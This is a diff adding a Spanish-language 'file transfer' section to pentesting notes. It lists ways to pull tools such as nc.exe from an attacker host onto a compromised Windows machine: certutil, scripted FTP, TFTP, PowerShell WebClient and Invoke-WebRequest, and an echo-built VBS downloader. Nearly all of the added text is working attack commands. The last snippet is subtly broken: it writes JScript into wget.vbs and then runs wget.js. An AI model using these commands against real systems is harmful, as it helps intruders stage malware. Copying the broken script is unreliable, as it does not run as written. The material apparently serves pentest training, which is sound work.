@@ -38,6 +38,7 @@
        * [Burpsuite](#burpsuite)     
      * [Pentesting Linux](#pentesting-linux)
      * [Pentesting Windows](#pentesting-windows)
+        * [Transferencia de Archivos](#transferencia-de-archivos)
           
 Antecedentes
 ===============================================================================================================================
@@ -1133,3 +1134,130 @@ Para apuntar a dicho script tenemos 3 vías:
 ### Pentesting Linux
 
 ### Pentesting Windows
+
+#### Transferencia de Archivos
+
+Tenemos distintas formas de transferir archivos desde la máquina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de **certutil**, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la máquina Windows:
+
+`certutil.exe -f -urlcache -split http://nuestraIP:puerto/recurso.exe output.exe`
+
+En caso de no contar con **certutil**, podemos montarnos un servicio FTP en local, para posteriormente desde la máquina Windows vía **FTP** obtener los recursos. Para ello, tendremos que crear un archivo _.txt_ sobre la máquina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):
+
+```bash
+open 192.168.1.45 21
+user s4vitar
+password
+binary
+GET archivo
+bye
+```
+
+Para ello, simplemente desde el _CMD_ vamos haciendo lo siguiente:
+
+```bash
+echo open 192.168.1.45 21 > ftp.txt
+echo user s4vitar >> ftp.txt
+echo password >> ftp.txt
+echo binary >> ftp.txt
+echo GET archivo >> ftp.txt
+echo bye >> ftp.txt
+```
+
+Para que se realicen los pasos fijados sobre el fichero, es necesario desde la máquina Windows aplicar el siguiente comando:
+
+```bash
+ftp -v -n -s:ftp.txt
+```
+
+Una vez hecho, se realizará la transferencia y tendremos el recurso en la máquina Windows. Lo mismo habría valido para enviar archivos a nuestra máquina local.
+
+En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la máquina Linux:
+
+```bash
+python -m pyftpdlib -p 21 -w
+```
+
+Posteriormente, ejecutamos las mismas instrucciones del lado de la máquina comprometida.
+
+Otra vía para realizar la transferencia de archivos desde nuestra máquina de atacante a la máquina Windows comprometida es aprovecharse de la utilidad **TFTP**. Para ello, desde nuestra máquina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:
+
+```bash
+atftpd --daemon --port 69 /tftp
+```
+
+Una vez hecho, desde la máquina Windows, aplicamos el siguiente comando:
+
+```bash
+tftp -i 192.168.1.45 GET nc.exe
+```
+
+Otra vía para realizar transferencia de archivos es desde nuestra máquina de atacante, compartir los recursos a través de un servidor web vía Python:
+
+```bash
+python -m SimpleHTTPServer 443
+```
+
+Y desde la máquina Windows, aplicar los siguientes comandos de **Powershell**:
+
+```powershell
+powershell -c "(new-object  System.Net.WebClient).DownloadFile('http://192.168.1.45:443/file.exe','C:\Users\user\Desktop\file.exe')"
+
+# También podemos usar esta otra forma
+powershell Invoke-WebRequest "http://192.168.1.45:443/file.exe" -OutFile "C:\Users\user\Desktop\file.exe"
+```
+
+Por si todas estas vías de transferencia de archivos se nos quedan cortas, podemos hacerlo a través de un script en **VBS**, que suele funcionar para la mayoría de las veces. Para ello, desde la máquina Windows, tendremos que aplicar las siguientes instrucciones:
+
+```bash
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+```
+
+Una vez definido el recurso **wget.vbs**, aplicamos el siguiente comando para una vez montando nuestro servidor web vía Python en la máquina atacante, descargar los recursos que consideremos:
+
+```bash
+cscript wget.vbs http://192.168.1.45:443/file.exe file.exe
+```
+
+Por si vemos que es mucha molestia estar definiendo todo el script _wget.vbs_, podemos acotarlo de la siguiente forma, y funcionará igualmente:
+
+```bash
+echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); > wget.vbs
+echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); >> wget.vbs
+echo WinHttpReq.Send(); >> wget.vbs
+echo WScript.Echo(WinHttpReq.ResponseText); >> wget.vbs
+echo BinStream = new ActiveXObject("ADODB.Stream"); >> wget.vbs
+echo BinStream.Type = 1; >> wget.vbs
+echo BinStream.Open(); >> wget.vbs
+echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.vbs
+echo BinStream.SaveToFile("out.bin"); >> wget.vbs
+```
+
+Una vez hecho, desde la propia máquina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:
+
+```bash
+cscript /nologo wget.js http://192.168.1.45:443/recurso.exe
+```
